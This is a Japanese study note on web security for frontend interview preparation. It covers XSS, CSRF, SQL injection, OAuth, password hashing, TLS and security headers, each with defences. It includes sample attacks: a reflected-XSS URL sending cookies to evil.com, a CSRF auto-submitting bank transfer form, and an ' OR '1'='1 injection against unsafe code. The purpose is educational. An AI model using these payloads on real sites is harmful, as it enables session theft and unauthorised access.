---
type: concept
title: "Web Security"
tags:
  - develop
  - security
  - xss
  - csrf
  - authentication
updated: 2026-05-29
---

# Web Security

フロントエンドエンジニアとして「セキュリティを理解している」を示すための知識。OWASP Top 10 の主要項目を中心に。

---

## XSS（Cross-Site Scripting）

攻撃者が悪意あるスクリプトをWebページに埋め込み、ユーザーのブラウザで実行させる攻撃。

### 反射型 XSS（Reflected XSS）

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

URLのパラメータがそのまま画面に出力される場合に発生。

### 格納型 XSS（Stored XSS）

掲示板やコメント欄にスクリプトを書き込み、他のユーザーが閲覧した時に実行される。最も危険。

### 対策

1. **エスケープ処理**: 出力時に `<`, `>`, `"`, `'`, `&` をHTMLエンティティに変換  
   → React は JSX で自動エスケープ（`dangerouslySetInnerHTML` は使わない）
2. **CSP（Content Security Policy）**: 許可するスクリプト読み込み元を制限  
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
   ```
3. **HttpOnly Cookie**: JavaScriptからCookieを読めなくする

---

## CSRF（Cross-Site Request Forgery）

ログイン済みユーザーが、知らずに攻撃者が用意したサイトを開き、意図しないリクエストを送らされる攻撃。

```html
<!-- 悪意あるサイトに仕込まれたフォーム -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="100000">
</form>
<script>document.forms[0].submit();</script>
```

ユーザーが bank.com にログイン済みだとCookieが自動送信され、被害が発生。

### 対策

1. **CSRFトークン**: サーバーがランダムなトークンをHTML内に埋め込み、POST時に検証  
2. **SameSite=Strict/Lax Cookie**: クロスサイトリクエスト時にCookieを送らない  
3. **Origin/Refererヘッダー検証**: サーバー側でリクエスト元を確認

**JWT + AuthorizationヘッダーならCSRFのリスクは低い**（Cookieに乗せないため）。

---

## SQLインジェクション

```python
# 危険: 文字列結合でSQLを組み立てる
query = f"SELECT * FROM users WHERE name = '{user_input}'"
# user_input = "' OR '1'='1" → 全件取得される
```

### 対策

**プレースホルダー（パラメータ化クエリ）** を使う。

```python
# SQLAlchemy（ChocoPLAiで使用）は自動でパラメータ化
result = db.execute(select(User).where(User.name == user_input))
```

ORMを使えばほぼ防げるが、生SQLを書く場合は必ずパラメータ化を確認する。

---

## 認証・認可

### 認証（Authentication）と認可（Authorization）

- **認証**: あなたは誰か（ログイン確認）
- **認可**: あなたは何をしていいか（権限確認）

### OAuth 2.0 / OpenID Connect

- **OAuth 2.0**: 認可のプロトコル（「GoogleがRinkaのカレンダーへのアクセスを許可する」）
- **OpenID Connect**: OAuth 2.0の上に認証を追加（「このユーザーはRinkaである」）

NextAuth は OpenID Connect ベース。Google/GitHub 等のプロバイダーと統合しやすい。

### パスワードのハッシュ化

```python
# bcryptを使う（コスト係数で計算コストを調整可能）
from passlib.context import CryptContext
pwd_context = CryptContext(schemes=["bcrypt"])
hashed = pwd_context.hash(plain_password)
pwd_context.verify(plain_password, hashed)
```

- MD5・SHA-1 は速すぎてブルートフォースに弱い → **bcrypt / Argon2** を使う
- ソルト（ランダム値）を加算してレインボーテーブル攻撃を防ぐ

---

## HTTPS / TLS

- HTTP over TLS。通信を暗号化してMITM（中間者攻撃）を防ぐ。
- TLS 1.2 以降を使う（1.0・1.1 は廃止）
- **証明書**: CA（認証局）が発行。Let's Encrypt で無料取得可能。
- **HSTS（HTTP Strict Transport Security）**: HTTPアクセスを自動でHTTPSにリダイレクトするようブラウザに指示

---

## その他の重要ヘッダー

```
X-Content-Type-Options: nosniff      # MIMEスニッフィング防止
X-Frame-Options: DENY                 # Clickjacking防止（iframeに埋め込ませない）
Referrer-Policy: strict-origin        # Refererヘッダーで漏れる情報を制御
Permissions-Policy: camera=()         # ブラウザAPIの使用制限
```

---

## 依存パッケージの脆弱性管理

```bash
npm audit          # 脆弱性チェック
npm audit fix      # 自動修正
```

- `package.json` の依存は定期的に `npm audit` でチェック
- Dependabot（GitHub）で自動PRを設定する

---

## よくある面接質問と回答の軸

**Q: XSSとCSRFの違いを教えてください**  
A: XSSは「攻撃者のスクリプトをユーザーのブラウザで動かす」攻撃。CSRFは「ログイン済みユーザーに意図しないリクエストを送らせる」攻撃。XSSはフロント側の出力処理が主な防御、CSRFはSameSite CookieやCSRFトークンが防御。

**Q: プロジェクトで何かセキュリティ対策をしましたか？**  
A: ChocoPLAiでは Claude API のレスポンスをそのままDOMに埋め込まず React の JSX を経由させることでXSSを防いだ。認証は JWT + NextAuth を使い、HttpOnly Cookie と SameSite 設定を組み合わせた。

## 関連

- [[HTTP Browser Basics]] — Cookie属性・CSPの詳細
- [[Database Essentials]] — SQLインジェクション対策のORM利用
- [[TypeScript Frontend]] — dangerouslySetInnerHTML を使わないReact実装
